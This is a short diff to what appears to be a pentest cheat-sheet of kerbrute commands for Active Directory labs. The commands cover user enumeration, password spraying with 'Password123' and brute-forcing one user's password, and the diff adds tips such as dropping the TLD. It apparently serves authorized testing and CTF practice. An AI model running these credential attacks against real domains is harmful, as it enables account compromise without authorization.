@@ -36,10 +36,12 @@ kerbrute -dc-ip 10.10.111.242 -domain spookysec.local -users userlist.txt -outpu
 # Enumerate Users (go version)
 kerbrute userenum -d lab.example.com big_names_list.txt -o foundusers.txt
 ;; or
-./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local users.txt -o foundusers.txt
+./kerbrute userenum --dc <ip_or_hostname_of_DC> -d <DOMAINNAMEWITHOUTTLD> users.txt -o foundusers.txt
 
 # Password Spray (with Password123) (go version)
+;; if it does not work try to remove the TLD, the ".com"
 kerbrute passwordspray -d lab.example.com valid_domain_users.txt Password123 -o results.txt
 
 # Password Bruteforce for a user(only if there is no lockout policy in place) (go version)
+;; if it does not work try to remove the TLD, the ".com"
 kerbrute bruteuser -d lab.example.com password_list.txt jsmith -o results.txt
